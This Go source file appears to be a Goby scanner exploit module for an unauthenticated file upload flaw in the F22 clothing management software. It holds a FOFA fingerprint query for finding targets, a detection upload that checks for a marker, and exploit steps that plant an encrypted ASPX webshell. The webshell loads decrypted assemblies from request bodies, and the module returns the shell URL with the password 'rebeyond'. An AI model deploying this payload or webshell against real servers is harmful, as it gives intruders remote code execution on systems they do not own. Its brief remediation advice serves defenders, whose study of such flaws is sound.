package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "F22 Clothing Management Software System Uploadhandler.ashx Any file Upload",
    "Description": "<p>Guangzhou Jinmingtai Software Technology Co., Ltd. is a high -tech enterprise specializing in information solutions for brand clothing and shoe bags. Access, upload interface through unauthorized files, can achieve the command execution effect, and the attacker can eventually use the vulnerability to obtain the server permission.</p>",
    "Product": "F22 clothing management software system",
    "Homepage": "http://www.x2erp.com/",
    "DisclosureDate": "2022-11-21",
    "Author": "2935900435@qq.com",
    "FofaQuery": "body=\"Login_btn\" && body=\"Login_Ipt\" && body=\"login_title\"",
    "GobyQuery": "body=\"Login_btn\" && body=\"Login_Ipt\" && body=\"login_title\"",
    "Level": "3",
    "Impact": "<p>The F22 clothing management software /Cutesoft_Client/uploadHandler.Ashx attacker developed by Guangzhou Jinmingtai Software Technology Co., Ltd. can successfully use the loopholes through the interface to achieve the effect of uploading any file, thereby obtaining the management authority of the target system.</p>",
    "Recommendation": "<p>1. Configure access control strategy: Restricted access to path /cutesoft_client/uploadHandler.AshX</p><p>2. Contact the manufacturer to get the latest patch information: <a href=\"http://www.x2erp.com/\">http://www.x2erp.com/</a></p><p>3. Expansion of the whitelist check file</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/CuteSoft_Client/UploadHandler.ashx",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data; boundary=----------ae0KM7Ef1KM7cH2ae0GI3ae0gL6Ef1"
                },
                "data_type": "text",
                "data": "------------ae0KM7Ef1KM7cH2ae0GI3ae0gL6Ef1\nContent-Disposition: form-data; name=\"folder\"\n\n/upload/udplog\n------------ae0KM7Ef1KM7cH2ae0GI3ae0gL6Ef1\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"1.aspx\"\nContent-Type: application/octet-stream\n\n <%@Page Language=\"C#\"%>\n <%\n Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));\n System.IO.File.Delete(Request.PhysicalPath);\n %>\n------------ae0KM7Ef1KM7cH2ae0GI3ae0gL6Ef1\nContent-Disposition: form-data; name=\"Upload\"\n\nSubmit Query\n------------ae0KM7Ef1KM7cH2ae0GI3ae0gL6Ef1--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "1\\,\\d+\\.aspx",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "file|lastbody|regex|1\\,(\\d+\\.aspx)"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/upload/udplog/{{{file}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/CuteSoft_Client/UploadHandler.ashx",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data; boundary=----------ae0KM7Ef1KM7cH2ae0GI3ae0gL6Ef1"
                },
                "data_type": "text",
                "data": "------------ae0KM7Ef1KM7cH2ae0GI3ae0gL6Ef1\nContent-Disposition: form-data; name=\"folder\"\n\n/upload/udplog\n------------ae0KM7Ef1KM7cH2ae0GI3ae0gL6Ef1\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"1.aspx\"\nContent-Type: application/octet-stream\n\n<%@ Page Language=\"C#\" %><%@Import Namespace=\"System.Reflection\"%><%Session.Add(\"k\",\"e45e329feb5d925b\"); byte[] k = Encoding.Default.GetBytes(Session[0] + \"\"),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"U\").Equals(this);%>\n------------ae0KM7Ef1KM7cH2ae0GI3ae0gL6Ef1\nContent-Disposition: form-data; name=\"Upload\"\n\nSubmit Query\n------------ae0KM7Ef1KM7cH2ae0GI3ae0gL6Ef1--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "1\\,\\d+\\.aspx",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "file|lastbody|regex|1\\,(\\d+\\.aspx)",
                "output|lastbody|text|webshell:{{{fixedhostinfo}}}/upload/udplog/{{{file}}}  password:rebeyond"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "F22服装管理软件系统UploadHandler.ashx任意文件上传",
            "Product": "F22服装管理软件系统",
            "Description": "<p>广州锦铭泰软件科技有限公司，是一家专业为品牌服饰鞋包企业提供信息化解决方案的高科技企业，该公司开发的F22服装管理软件系统/CuteSoft_Client/UploadHandler.ashx存在该系统存在接口未授权访问，通过未授权的文件上传接口，可以达到命令执行效果，攻击者最终可利用该漏洞获取服务器权限。<br></p>",
            "Recommendation": "<p>1、配置访问控制策略：对路径 /CuteSoft_Client/UploadHandler.ashx 进行限制访问</p><p>2、联系厂商获取最新补丁信息：<a href=\"http://www.x2erp.com/\">http://www.x2erp.com/</a></p><p>3、白名单检查文件扩展名</p>",
            "Impact": "<p>广州锦铭泰软件科技有限公司开发的F22服装管理软件 /CuteSoft_Client/UploadHandler.ashx攻击者可以通过该接口成功利用漏洞能实现任意文件上传的效果，从而获取目标系统管理权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "F22 Clothing Management Software System Uploadhandler.ashx Any file Upload",
            "Product": "F22 clothing management software system",
            "Description": "<p>Guangzhou Jinmingtai Software Technology Co., Ltd. is a high -tech enterprise specializing in information solutions for brand clothing and shoe bags. Access, upload interface through unauthorized files, can achieve the command execution effect, and the attacker can eventually use the vulnerability to obtain the server permission.<br></p>",
            "Recommendation": "<p>1. Configure access control strategy: Restricted access to path /cutesoft_client/uploadHandler.AshX</p><p>2. Contact the manufacturer to get the latest patch information: <a href=\"http://www.x2erp.com/\">http://www.x2erp.com/</a></p><p>3. Expansion of the whitelist check file</p>",
            "Impact": "<p>The F22 clothing management software /Cutesoft_Client/uploadHandler.Ashx attacker developed by Guangzhou Jinmingtai Software Technology Co., Ltd. can successfully use the loopholes through the interface to achieve the effect of uploading any file, thereby obtaining the management authority of the target system.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}